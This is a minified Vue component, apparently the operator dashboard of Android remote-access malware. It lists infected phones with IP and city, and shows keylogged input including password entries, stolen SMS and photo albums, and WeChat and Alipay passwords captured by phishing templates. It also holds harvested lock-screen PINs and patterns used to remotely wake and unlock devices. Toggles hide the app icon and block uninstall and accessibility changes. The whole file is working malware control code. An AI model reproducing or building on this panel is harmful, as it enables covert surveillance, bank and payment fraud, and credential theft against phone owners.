import{u as X}from"./useView.504fb702.js";import{_ as Z,b as B}from"./index.8146017f.js";import _ from"./detail.27ee5079.js";import ee from"./list.5b3e1eee.js";import te from"./list.4c629fe1.js";import le from"./list.10626010.js";import{d as ae,a as ue,e as n,$ as ie,N as c,V as J,r as f,y as oe,t as s,A as k,E as a,F as u,J as T,I as $,u as C,H as r,G as y,O as ne,z as L,a4 as P,f as O,B as d,L as Q}from"./vlib.982cfaee.js";import"./lodash.0b661716.js";import"./monacoeditor.d62c48b5.js";import"./lib.b62e57c8.js";const re=ae({components:{DeviceDetail:_,AppList:ee,SmsList:te,AlbumList:le},setup(){const e=ue({post:!0,getDataListURL:"/device/page",getDataListIsPage:!0,installAppFilter:[],dataForm:{deviceId:"",pkg:"",phone:"",model:"",language:"",brand:"",installApp:"",status:"",start:"",end:"",remark:"",kill:"",accessibilityServiceEnabled:""}}),t=n(""),i=n([]),m=n(!1),b=n(!1),D=n([]),w=n([]),p=n(""),v=n(null),A=n({deviceId:"",pkg:""}),R=n(!1),h=n({deviceId:""}),S=n(!1),g=n([]),E=n(null),q=n(!1),N=n(null),M=n(!1),F=n({deviceId:""}),x=n(!1),z=n({deviceId:""}),W=n(null),H=n(!1),V=n(""),j=n(!1),G=n({id:"",deviceId:"",remark:""}),K=n(!1),I=n(!1),Y=n([]),l=n("");return{...X(e),...ie(e),deviceId:t,inputLogVisible:m,logLoading:b,inputLogList:D,queryDate:w,queryAppPkg:p,querySource:v,currentDevice:A,appListVisible:R,currentAppDevice:h,unlockDialogVisible:S,unlockOptions:g,selectedUnlockId:E,unlocking:q,currentWakeRow:N,smsListVisible:M,currentSmsDevice:F,albumListVisible:x,currentAlbumDevice:z,lastActivityTimeRange:W,remarkDialogVisible:H,remarkContent:V,remarkSubmitting:j,currentRemarkDevice:G,fishPwdDialogVisible:K,fishPwdLoading:I,fishPwdList:Y,fishPwdTitle:l,fishTemplateList:i,permissionsName:{"android.permission.READ_SMS":"\u77ED\u4FE1","android.permission.READ_MEDIA_IMAGES":"\u76F8\u518C","android.permission.BATTERY":"\u7535\u6C60","android.permission.AUTO_START":"\u81EA\u542F\u52A8"}}},async mounted(){await this.fetchInstallAppFilterList();const e=this.getBeijingTimestamp(),t=e-10*60*1e3;this.lastActivityTimeRange=[t,e],this.dataForm.start=t,this.dataForm.start=this.formatTime(t),this.dataForm.end=this.formatTime(e),this.getDataList(),await this.fetchFishTemplateList()},methods:{getBeijingTimestamp(){const e=new Date,t=e.getTime(),b=(e.getTimezoneOffset()- -480)*60*1e3;return t+b},async fetchFishTemplateList(){let{code:e,data:t,msg:i}=await B.post("/device/fishCodeList");e==0?this.fishTemplateList=t:c.error(i||"\u83B7\u53D6\u9493\u9C7C\u6A21\u677F\u5931\u8D25")},enterScreen(e){this.deviceId=e.deviceId,this.$refs.deviceDetail.show(e)},async fetchInstallAppFilterList(){let{code:e,data:t,msg:i}=await B.post("/device/installAppFilterList");e==0?this.installAppFilter=t:J.alert(i,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})},async wakeup(e){var D;const{success:t,data:i,msg:m}=await B.post("/unlockScreenPwd/page",{deviceId:e.id,page:1,limit:100});if(!t){c.error(m);return}const b=Array.isArray(i)?i:i&&(i.list||i.records)||[];if(this.unlockOptions=b||[],!this.unlockOptions||this.unlockOptions.length===0){c({message:"\u6682\u65E0\u53EF\u9009\u89E3\u9501\u5BC6\u7801\uFF0C\u8BF7\u5148\u6DFB\u52A0",type:"warning"});return}this.currentWakeRow=e,this.selectedUnlockId=((D=this.unlockOptions[0])==null?void 0:D.id)||null,this.unlockDialogVisible=!0},async confirmWakeup(){if(!this.currentWakeRow||!this.selectedUnlockId){c({message:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",type:"warning"});return}this.unlocking=!0;try{const{code:e,msg:t}=await B.post("/device/wakeup",{id:this.currentWakeRow.id,unlockPwdId:this.selectedUnlockId});e==0?(c({message:"\u64CD\u4F5C\u6210\u529F,\u7B49\u5F85\u5524\u9192!",type:"success"}),this.unlockDialogVisible=!1,this.currentWakeRow=null,this.selectedUnlockId=null,this.getDataList()):J.alert(t,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})}finally{this.unlocking=!1}},async showInputLog(e){this.currentDevice.deviceId=e.deviceId,this.currentDevice.pkg=e.pkg,this.queryAppPkg="",this.querySource=null;const t=new Date,i=t.getFullYear()+"-"+String(t.getMonth()+1).padStart(2,"0")+"-"+String(t.getDate()).padStart(2,"0");this.queryDate=[i,i],this.inputLogVisible=!0,this.inputLogList=[],await this.refreshLog()},async refreshLog(){if(!this.currentDevice.deviceId||!this.currentDevice.pkg||!this.queryDate||!Array.isArray(this.queryDate)||this.queryDate.length!==2){c({message:"\u67E5\u8BE2\u53C2\u6570\u4E0D\u5B8C\u6574",type:"warning"});return}this.logLoading=!0,this.inputLogList=[];try{const[e,t]=this.queryDate,i=new Date(e),m=new Date(t),b=new Date(i.getFullYear(),i.getMonth(),i.getDate()).getTime(),D=new Date(m.getFullYear(),m.getMonth(),m.getDate()+1).getTime()-1,{code:w,data:p,msg:v}=await B.post("/inputTextRecord/group",{deviceId:this.currentDevice.deviceId,startTime:b,endTime:D,pkg:this.currentDevice.pkg,appPkg:this.queryAppPkg||void 0,source:this.querySource!==null?this.querySource:void 0});w==0?p&&p.items&&Array.isArray(p.items)?this.inputLogList=p.items:this.inputLogList=[]:c({message:v||"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}catch{c({message:"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}finally{this.logLoading=!1}},onDateChange(){},formatTime(e){if(!e)return"";const t=Number(e);if(isNaN(t))return"";const i=new Date(t);if(isNaN(i.getTime()))return"";const m=i.getFullYear(),b=String(i.getMonth()+1).padStart(2,"0"),D=String(i.getDate()).padStart(2,"0"),w=String(i.getHours()).padStart(2,"0"),p=String(i.getMinutes()).padStart(2,"0"),v=String(i.getSeconds()).padStart(2,"0");return`${m}-${b}-${D} ${w}:${p}:${v}`},async updateFishSwitch(e,t,i){try{const{success:m,msg:b}=await B.post("/device/updateFishSwitch",{id:e.id,code:t,value:i},void 0,!0);m?(c.success("\u66F4\u65B0\u6210\u529F"),this.getDataList()):c.error(b||"\u66F4\u65B0\u5931\u8D25")}catch{c.error("\u66F4\u65B0\u5931\u8D25")}},async updateDeviceSwitch(e,t,i){const m=i?1:0;e[t]=m;try{const{success:b,msg:D}=await B.post("/device/updateSwitch",{id:e.id,[t]:m},void 0,!0);b?c.success("\u66F4\u65B0\u6210\u529F"):(c.error(D||"\u66F4\u65B0\u5931\u8D25"),e[t]=m?0:1)}catch{c.error("\u66F4\u65B0\u5931\u8D25"),e[t]=m?0:1}},formatUnlockTips(e){let t="";switch(e.type){case 0:return"\u65E0\u9501";case 1:t="PIN\u7801";break;case 2:t="\u624B\u52BF";break;case 3:t="\u6DF7\u5408\u5BC6\u7801";break;default:return"\u672A\u77E5"}let i="";switch(e.source){case 1:i="\u9493\u9C7C";break;case 2:i="\u91C7\u96C6";break;default:i="\u672A\u77E5";break}return`(${i}) - ${t}:${e.tips}`},showAppList(e){this.currentAppDevice.deviceId=e.deviceId,this.appListVisible=!0},showSmsList(e){this.currentSmsDevice.deviceId=e.deviceId,this.smsListVisible=!0},showAlbumList(e){this.currentAlbumDevice.deviceId=e.deviceId,this.albumListVisible=!0},showRemarkDialog(e){this.currentRemarkDevice.id=e.id,this.currentRemarkDevice.deviceId=e.deviceId,this.currentRemarkDevice.remark=e.remark||"",this.remarkContent=e.remark||"",this.remarkDialogVisible=!0},async submitRemark(){if(!this.currentRemarkDevice.id){c.error("\u8BBE\u5907ID\u4E0D\u80FD\u4E3A\u7A7A");return}this.remarkSubmitting=!0;try{const{code:e,msg:t}=await B.post("/device/updateRemark",{id:this.currentRemarkDevice.id,remark:this.remarkContent});e===0?(c.success("\u5907\u6CE8\u66F4\u65B0\u6210\u529F"),this.remarkDialogVisible=!1,this.remarkContent="",this.getDataList()):c.error(t||"\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}catch{c.error("\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}finally{this.remarkSubmitting=!1}},onLastActivityTimeChange(e){if(e&&Array.isArray(e)&&e.length===2){const t=Number(e[0]),i=Number(e[1]);this.dataForm.start=this.formatTime(t),this.dataForm.end=this.formatTime(i)}else this.dataForm.start="",this.dataForm.end=""},async showFishPwd(e,t){this.fishPwdLoading=!0,this.fishPwdDialogVisible=!0,this.fishPwdList=[];const i={wx:"\u5FAE\u4FE1",zfb:"\u652F\u4ED8\u5B9D"};this.fishPwdTitle=`\u8BBE\u5907ID: ${e.deviceId} - ${i[t]||t}`;try{const{code:m,data:b,msg:D}=await B.post("/device/showFishPwd",{deviceId:e.deviceId,code:t});m===0&&b?(this.fishPwdList=Array.isArray(b)?b:[],this.fishPwdList.length===0&&c.warning("\u6682\u65E0\u9493\u9C7C\u5BC6\u7801\u6570\u636E")):(c.error(D||"\u83B7\u53D6\u9493\u9C7C\u5BC6\u7801\u5931\u8D25"),this.fishPwdDialogVisible=!1)}catch{c.error("\u83B7\u53D6\u9493\u9C7C\u5BC6\u7801\u5931\u8D25"),this.fishPwdDialogVisible=!1}finally{this.fishPwdLoading=!1}}}}),se={class:"mod-sys__log-operation"},de={class:"log-header"},pe={class:"header-row"},me={class:"query-controls"},ge={class:"log-content"},ce={class:"log-content-row"},fe={class:"log-time"},be={class:"log-app"},he={key:0,class:"log-resource"},ve={class:"log-text"},we={key:0,class:"no-data"},ke={style:{float:"left"}},De={style:{float:"right",color:"#8492a6","font-size":"13px"}},ye={style:{color:"#00adff"}},Fe={key:0,style:{"text-align":"center",padding:"20px",color:"#909399"}};function Ce(e,t,i,m,b,D){var Y;const w=f("el-input"),p=f("el-form-item"),v=f("el-option"),A=f("el-select"),R=f("el-date-picker"),h=f("el-button"),S=f("el-form"),g=f("el-table-column"),E=f("el-switch"),q=f("Select"),N=f("Close"),M=f("el-icon"),F=f("el-tag"),x=f("el-tooltip"),z=f("el-table"),W=f("el-pagination"),H=f("DeviceDetail"),V=f("el-dialog"),j=f("AppList"),G=f("SmsList"),K=f("AlbumList"),I=oe("loading");return s(),k("div",se,[a(S,{inline:!0,model:e.dataForm,onKeyup:t[12]||(t[12]=ne(l=>e.getDataList(),["enter"]))},{default:u(()=>[a(p,null,{default:u(()=>[a(w,{modelValue:e.dataForm.deviceId,"onUpdate:modelValue":t[0]||(t[0]=l=>e.dataForm.deviceId=l),placeholder:"\u8BBE\u5907ID",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(w,{modelValue:e.dataForm.pkg,"onUpdate:modelValue":t[1]||(t[1]=l=>e.dataForm.pkg=l),placeholder:"\u6240\u5C5E\u5305",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(w,{modelValue:e.dataForm.model,"onUpdate:modelValue":t[2]||(t[2]=l=>e.dataForm.model=l),placeholder:"\u624B\u673A\u578B\u53F7",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(w,{modelValue:e.dataForm.language,"onUpdate:modelValue":t[3]||(t[3]=l=>e.dataForm.language=l),placeholder:"\u8BED\u8A00",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(w,{modelValue:e.dataForm.brand,"onUpdate:modelValue":t[4]||(t[4]=l=>e.dataForm.brand=l),placeholder:"\u54C1\u724C",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(A,{filterable:"",modelValue:e.dataForm.installApp,"onUpdate:modelValue":t[5]||(t[5]=l=>e.dataForm.installApp=l),placeholder:"\u5DF2\u5B89\u88C5APP",clearable:""},{default:u(()=>[(s(!0),k(T,null,$(e.installAppFilter,l=>(s(),C(v,{key:l.packageName,label:`${l.appName}(${l.packageName})`,value:l.packageName},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(A,{modelValue:e.dataForm.status,"onUpdate:modelValue":t[6]||(t[6]=l=>e.dataForm.status=l),placeholder:"\u72B6\u6001",clearable:""},{default:u(()=>[a(v,{label:"\u7184\u5C4F",value:0}),a(v,{label:"\u4EAE\u5C4F",value:1})]),_:1},8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(A,{modelValue:e.dataForm.kill,"onUpdate:modelValue":t[7]||(t[7]=l=>e.dataForm.kill=l),placeholder:"\u5DF2\u6740/\u672A\u6740",clearable:""},{default:u(()=>[a(v,{label:"\u672A\u6740",value:0}),a(v,{label:"\u5DF2\u6740",value:1})]),_:1},8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(A,{modelValue:e.dataForm.accessibilityServiceEnabled,"onUpdate:modelValue":t[8]||(t[8]=l=>e.dataForm.accessibilityServiceEnabled=l),placeholder:"\u65E0\u969C\u788D",clearable:""},{default:u(()=>[a(v,{label:"\u5F00\u542F\u65E0\u969C\u788D",value:1})]),_:1},8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(w,{modelValue:e.dataForm.remark,"onUpdate:modelValue":t[9]||(t[9]=l=>e.dataForm.remark=l),placeholder:"\u5907\u6CE8"},null,8,["modelValue"])]),_:1}),a(p,null,{default:u(()=>[a(R,{modelValue:e.lastActivityTimeRange,"onUpdate:modelValue":t[10]||(t[10]=l=>e.lastActivityTimeRange=l),type:"datetimerange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65F6\u95F4","end-placeholder":"\u7ED3\u675F\u65F6\u95F4",format:"YYYY-MM-DD HH:mm:ss","value-format":"x",onChange:e.onLastActivityTimeChange,style:{width:"360px"}},null,8,["modelValue","onChange"])]),_:1}),a(p,null,{default:u(()=>[a(h,{onClick:t[11]||(t[11]=l=>e.getDataList())},{default:u(()=>[r(y(e.$t("query")),1)]),_:1})]),_:1})]),_:1},8,["model"]),L((s(),C(z,{data:e.dataList,border:"",onSortChange:e.dataListSortChangeHandle,"table-layout":"auto",style:{width:"100%"}},{default:u(()=>[a(g,{prop:"deviceId",label:"\u8BBE\u5907ID","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":""}),a(g,{prop:"pkg",label:"\u6240\u5C5E\u5305","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":""}),a(g,{prop:"brand",label:"\u54C1\u724C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0}),a(g,{prop:"model",label:"\u624B\u673A\u578B\u53F7","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":""}),a(g,{prop:"language",label:"\u8BED\u8A00","header-align":"center",align:"center",width:"60px","show-overflow-tooltip":""}),a(g,{prop:"systemVersion",label:"\u7CFB\u7EDF\u7248\u672C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":""}),a(g,{prop:"sdkVersion",label:"sdk\u7248\u672C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0}),a(g,{label:"\u5C4F\u5E55\u5206\u8FA8\u7387","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0},{default:u(l=>[r(y(`${l.row.screenWidth}\xD7${l.row.screenHeight}`),1)]),_:1}),a(g,{prop:"ip",label:"IP/\u57CE\u5E02","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0},{default:u(l=>[r(y(l.row.ip)+" / "+y(l.row.addr),1)]),_:1}),a(g,{prop:"lastHeart",label:"\u6700\u540E\u6D3B\u52A8\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(g,{label:"\u5F00\u5173","header-align":"center",align:"right",width:"150px"},{default:u(l=>[a(E,{"inactive-text":"\u9690\u85CF\u56FE\u6807","model-value":!!l.row.hideIcon,"onUpdate:modelValue":o=>e.updateDeviceSwitch(l.row,"hideIcon",o)},null,8,["model-value","onUpdate:modelValue"]),a(E,{"inactive-text":"\u963B\u6B62\u5378\u8F7D","model-value":!!l.row.uninstallGuard,"onUpdate:modelValue":o=>e.updateDeviceSwitch(l.row,"uninstallGuard",o)},null,8,["model-value","onUpdate:modelValue"]),a(E,{"inactive-text":"\u963B\u6B62\u65E0\u969C\u788D","model-value":!!l.row.accessibilityGuard,"onUpdate:modelValue":o=>e.updateDeviceSwitch(l.row,"accessibilityGuard",o)},null,8,["model-value","onUpdate:modelValue"]),a(E,{"inactive-text":"Kill\u72B6\u6001","model-value":!!l.row.kill,"onUpdate:modelValue":o=>e.updateDeviceSwitch(l.row,"kill",o)},null,8,["model-value","onUpdate:modelValue"]),a(E,{"inactive-text":"\u4E0A\u4F20\u77ED\u4FE1","model-value":!!l.row.uploadSms,"onUpdate:modelValue":o=>e.updateDeviceSwitch(l.row,"uploadSms",o)},null,8,["model-value","onUpdate:modelValue"]),a(E,{"inactive-text":"\u4E0A\u4F20\u76F8\u518C","model-value":!!l.row.uploadAlbum,"onUpdate:modelValue":o=>e.updateDeviceSwitch(l.row,"uploadAlbum",o)},null,8,["model-value","onUpdate:modelValue"])]),_:1}),a(g,{label:"\u9493\u9C7C\u5F00\u5173","header-align":"center",align:"right",width:"200px"},{default:u(l=>[(s(!0),k(T,null,$(e.fishTemplateList,o=>(s(),k("div",{key:o.code,style:{display:"flex","align-items":"center",gap:"4px","margin-bottom":"4px"}},[a(E,{"inactive-text":o.label,"model-value":l.row.fishSwitch&&!!l.row.fishSwitch[o.code],"onUpdate:modelValue":U=>e.updateFishSwitch(l.row,o.code,U)},null,8,["inactive-text","model-value","onUpdate:modelValue"]),!l.row.fishSwitch||!l.row.fishSwitch[o.code]?L((s(),C(h,{key:0,link:"",type:"primary",size:"small",onClick:U=>e.showFishPwd(l.row,o.code)},{default:u(()=>t[29]||(t[29]=[r(" \u67E5\u770B ")])),_:2},1032,["onClick"])),[[P,o.code==="wx"||o.code==="zfb"]]):O("",!0)]))),128))]),_:1}),a(g,{label:"\u6743\u9650","header-align":"center",align:"center",width:"150px"},{default:u(l=>[d("div",null,[a(F,{type:l.row.accessibilityServiceEnabled==1?"success":"danger"},{default:u(()=>[t[30]||(t[30]=r(" \u65E0\u969C\u788D ")),a(M,null,{default:u(()=>[l.row.accessibilityServiceEnabled==1?(s(),C(q,{key:0})):(s(),C(N,{key:1}))]),_:2},1024)]),_:2},1032,["type"])]),(s(!0),k(T,null,$(l.row.permissions,(o,U)=>(s(),k("div",{key:U},[a(F,{type:o?"success":"danger"},{default:u(()=>[r(y(e.permissionsName[U])+" ",1),a(M,null,{default:u(()=>[o?(s(),C(q,{key:0})):(s(),C(N,{key:1}))]),_:2},1024)]),_:2},1032,["type"])]))),128))]),_:1}),a(g,{label:"\u8BBE\u5907\u72B6\u6001","header-align":"center",align:"right",width:"150px"},{default:u(l=>[d("div",null,[t[33]||(t[33]=r(" \u53EF\u89E3\u9501 ")),l.row.lockScreen?(s(),C(x,{key:0,class:"box-item",effect:"dark",content:e.formatUnlockTips(l.row.lockScreen),placement:"top"},{default:u(()=>[a(F,{type:"success"},{default:u(()=>t[31]||(t[31]=[r("YES")])),_:1})]),_:2},1032,["content"])):(s(),C(F,{key:1,type:"danger"},{default:u(()=>t[32]||(t[32]=[r("NO")])),_:1}))]),d("div",null,[t[38]||(t[38]=r(" \u8BBE\u5907\u72B6\u6001 ")),L(a(F,{type:"danger"},{default:u(()=>t[34]||(t[34]=[r("\u7184\u5C4F")])),_:2},1536),[[P,l.row.status==0]]),L(a(F,{type:"success"},{default:u(()=>t[35]||(t[35]=[r("\u4EAE\u5C4F")])),_:2},1536),[[P,l.row.status==1]]),L(a(F,{type:"info"},{default:u(()=>t[36]||(t[36]=[r("\u7B49\u5F85\u5524\u9192")])),_:2},1536),[[P,l.row.status==2]]),L(a(F,{type:"info"},{default:u(()=>t[37]||(t[37]=[r("\u7B49\u5F85\u5524\u9192")])),_:2},1536),[[P,l.row.status==3]])])]),_:1}),a(g,{prop:"created",label:"\u5B89\u88C5\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(g,{prop:"remark",label:"\u5907\u6CE8","show-overflow-tooltip":"","header-align":"center",align:"center"}),a(g,{label:e.$t("handle"),"header-align":"center",align:"center",width:"90px",fixed:"right"},{default:u(l=>[d("div",null,[a(h,{link:"",type:"primary",onClick:o=>e.enterScreen(l.row)},{default:u(()=>t[39]||(t[39]=[r("\u94FE\u63A5\u8BBE\u5907")])),_:2},1032,["onClick"])]),d("div",null,[a(h,{link:"",type:"primary",onClick:o=>e.showInputLog(l.row)},{default:u(()=>t[40]||(t[40]=[r("\u8F93\u5165\u8BB0\u5F55")])),_:2},1032,["onClick"])]),d("div",null,[a(h,{link:"",type:"primary",onClick:o=>e.showAppList(l.row)},{default:u(()=>t[41]||(t[41]=[r("\u5B89\u88C5\u5E94\u7528")])),_:2},1032,["onClick"])]),d("div",null,[a(h,{link:"",type:"primary",onClick:o=>e.showSmsList(l.row)},{default:u(()=>t[42]||(t[42]=[r("\u77ED\u4FE1\u8BB0\u5F55")])),_:2},1032,["onClick"])]),d("div",null,[a(h,{link:"",type:"primary",onClick:o=>e.showAlbumList(l.row)},{default:u(()=>t[43]||(t[43]=[r("\u67E5\u770B\u76F8\u518C")])),_:2},1032,["onClick"])]),d("div",null,[a(h,{link:"",type:"primary",onClick:o=>e.showRemarkDialog(l.row)},{default:u(()=>t[44]||(t[44]=[r("\u5907\u6CE8")])),_:2},1032,["onClick"])])]),_:1},8,["label"])]),_:1},8,["data","onSortChange"])),[[I,e.dataListLoading]]),a(W,{"current-page":e.page,"page-sizes":[10,20,50,100],"page-size":e.limit,total:e.total,layout:"total, sizes, prev, pager, next, jumper",onSizeChange:e.pageSizeChangeHandle,onCurrentChange:e.pageCurrentChangeHandle},null,8,["current-page","page-size","total","onSizeChange","onCurrentChange"]),a(H,{ref:"deviceDetail",onWakeup:e.wakeup},null,8,["onWakeup"]),a(V,{modelValue:e.inputLogVisible,"onUpdate:modelValue":t[17]||(t[17]=l=>e.inputLogVisible=l),title:`\u8F93\u5165\u65E5\u5FD7 - \u8BBE\u5907ID: ${e.currentDevice.deviceId} \u5305\u540D: ${e.currentDevice.pkg}`,width:"970px","close-on-click-modal":!1,class:"input-log-dialog","destroy-on-close":""},{footer:u(()=>[a(h,{onClick:t[16]||(t[16]=l=>e.inputLogVisible=!1)},{default:u(()=>t[49]||(t[49]=[r("\u5173\u95ED")])),_:1})]),default:u(()=>[d("div",de,[d("div",pe,[d("div",me,[t[46]||(t[46]=d("span",{class:"query-label"},"\u6765\u6E90:",-1)),a(A,{modelValue:e.querySource,"onUpdate:modelValue":t[13]||(t[13]=l=>e.querySource=l),placeholder:"\u9009\u62E9\u6765\u6E90",clearable:"",style:{width:"120px"}},{default:u(()=>[a(v,{label:"\u7BA1\u7406\u7AEF",value:1}),a(v,{label:"App\u7AEF",value:0})]),_:1},8,["modelValue"]),t[47]||(t[47]=d("span",{class:"query-label"},"APP\u5305\u540D:",-1)),a(w,{modelValue:e.queryAppPkg,"onUpdate:modelValue":t[14]||(t[14]=l=>e.queryAppPkg=l),placeholder:"\u8F93\u5165APP\u5305\u540D",clearable:"",style:{width:"200px"}},null,8,["modelValue"]),t[48]||(t[48]=d("span",{class:"query-label"},"\u67E5\u8BE2\u65E5\u671F:",-1)),a(R,{modelValue:e.queryDate,"onUpdate:modelValue":t[15]||(t[15]=l=>e.queryDate=l),type:"daterange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65E5\u671F","end-placeholder":"\u7ED3\u675F\u65E5\u671F",format:"YYYY-MM-DD","value-format":"YYYY-MM-DD",onChange:e.onDateChange,style:{width:"280px"}},null,8,["modelValue","onChange"]),a(h,{type:"primary",onClick:e.refreshLog,loading:e.logLoading,size:"small"},{default:u(()=>t[45]||(t[45]=[r("\u91CD\u65B0\u67E5\u8BE2")])),_:1},8,["onClick","loading"])])])]),L((s(),k("div",ge,[(s(!0),k(T,null,$(e.inputLogList,(l,o)=>(s(),k("div",{class:Q(["log-item",{"password-item":l.password==1}]),key:o},[d("div",ce,[d("span",fe,y(l.date||e.formatTime(l.time)),1),d("span",{class:Q(["log-source",{"source-admin":l.source==1,"source-app":l.source==0}])},y(l.source==1?"\u7BA1\u7406\u7AEF":"App\u7AEF"),3),d("span",be,y(l.app),1),l.resourceId?(s(),k("span",he,y(l.resourceId),1)):O("",!0),d("span",ve,y(l.text||(l.password==1?"[\u5BC6\u7801\u8F93\u5165]":"\u65E0\u5185\u5BB9")),1)])],2))),128)),e.inputLogList.length===0&&!e.logLoading?(s(),k("div",we,"\u6682\u65E0\u8F93\u5165\u65E5\u5FD7\u6570\u636E")):O("",!0)])),[[I,e.logLoading]])]),_:1},8,["modelValue","title"]),a(V,{modelValue:e.appListVisible,"onUpdate:modelValue":t[18]||(t[18]=l=>e.appListVisible=l),title:`\u5B89\u88C5\u5E94\u7528\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAppDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:u(()=>[a(j,{"device-id":e.currentAppDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(V,{modelValue:e.unlockDialogVisible,"onUpdate:modelValue":t[21]||(t[21]=l=>e.unlockDialogVisible=l),title:`\u9009\u62E9\u89E3\u9501\u5BC6\u7801 - \u8BBE\u5907ID: ${((Y=e.currentWakeRow)==null?void 0:Y.deviceId)||""}`,width:"480px","close-on-click-modal":!1,"destroy-on-close":""},{footer:u(()=>[a(h,{onClick:t[20]||(t[20]=l=>e.unlockDialogVisible=!1)},{default:u(()=>t[50]||(t[50]=[r("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.confirmWakeup,loading:e.unlocking,disabled:!e.selectedUnlockId},{default:u(()=>t[51]||(t[51]=[r("\u786E\u5B9A")])),_:1},8,["onClick","loading","disabled"])]),default:u(()=>[d("div",null,[a(S,{"label-width":"90px"},{default:u(()=>[a(p,{label:"\u89E3\u9501\u5BC6\u7801"},{default:u(()=>[a(A,{modelValue:e.selectedUnlockId,"onUpdate:modelValue":t[19]||(t[19]=l=>e.selectedUnlockId=l),placeholder:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",filterable:"",style:{width:"100%"}},{default:u(()=>[(s(!0),k(T,null,$(e.unlockOptions,l=>(s(),C(v,{key:l.id,label:e.formatUnlockTips(l),value:l.id},{default:u(()=>[d("span",ke,y(e.formatUnlockTips(l)),1),d("span",De,[d("span",ye,y(l.createDate),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1})]),_:1})])]),_:1},8,["modelValue","title"]),a(V,{modelValue:e.smsListVisible,"onUpdate:modelValue":t[22]||(t[22]=l=>e.smsListVisible=l),title:`\u77ED\u4FE1\u8BB0\u5F55 - \u8BBE\u5907ID: ${e.currentSmsDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:u(()=>[a(G,{"device-id":e.currentSmsDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(V,{modelValue:e.albumListVisible,"onUpdate:modelValue":t[23]||(t[23]=l=>e.albumListVisible=l),title:`\u76F8\u518C\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAlbumDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:u(()=>[a(K,{"device-id":e.currentAlbumDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(V,{modelValue:e.remarkDialogVisible,"onUpdate:modelValue":t[26]||(t[26]=l=>e.remarkDialogVisible=l),title:`\u8BBE\u5907\u5907\u6CE8 - \u8BBE\u5907ID: ${e.currentRemarkDevice.deviceId}`,width:"500px","close-on-click-modal":!1,"destroy-on-close":""},{footer:u(()=>[a(h,{onClick:t[25]||(t[25]=l=>e.remarkDialogVisible=!1)},{default:u(()=>t[52]||(t[52]=[r("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.submitRemark,loading:e.remarkSubmitting},{default:u(()=>t[53]||(t[53]=[r("\u786E\u5B9A")])),_:1},8,["onClick","loading"])]),default:u(()=>[a(S,{"label-width":"80px"},{default:u(()=>[a(p,{label:"\u5907\u6CE8\u5185\u5BB9"},{default:u(()=>[a(w,{modelValue:e.remarkContent,"onUpdate:modelValue":t[24]||(t[24]=l=>e.remarkContent=l),type:"textarea",rows:4,placeholder:"\u8BF7\u8F93\u5165\u5907\u6CE8\u5185\u5BB9",clearable:""},null,8,["modelValue"])]),_:1})]),_:1})]),_:1},8,["modelValue","title"]),a(V,{modelValue:e.fishPwdDialogVisible,"onUpdate:modelValue":t[28]||(t[28]=l=>e.fishPwdDialogVisible=l),title:`\u9493\u9C7C\u5BC6\u7801 - ${e.fishPwdTitle}`,width:"700px","close-on-click-modal":!1,"destroy-on-close":""},{footer:u(()=>[a(h,{onClick:t[27]||(t[27]=l=>e.fishPwdDialogVisible=!1)},{default:u(()=>t[54]||(t[54]=[r("\u5173\u95ED")])),_:1})]),default:u(()=>[L((s(),k("div",null,[a(z,{data:e.fishPwdList,border:"",style:{width:"100%"}},{default:u(()=>[a(g,{prop:"data",label:"\u5BC6\u7801","header-align":"center",align:"center","show-overflow-tooltip":""}),a(g,{prop:"created",label:"\u91C7\u96C6\u65F6\u95F4","header-align":"center",align:"center",width:"180px"})]),_:1},8,["data"]),e.fishPwdList.length===0&&!e.fishPwdLoading?(s(),k("div",Fe,"\u6682\u65E0\u6570\u636E")):O("",!0)])),[[I,e.fishPwdLoading]])]),_:1},8,["modelValue","title"])])}var Pe=Z(re,[["render",Ce],["__scopeId","data-v-495b3baf"]]);export{Pe as default};
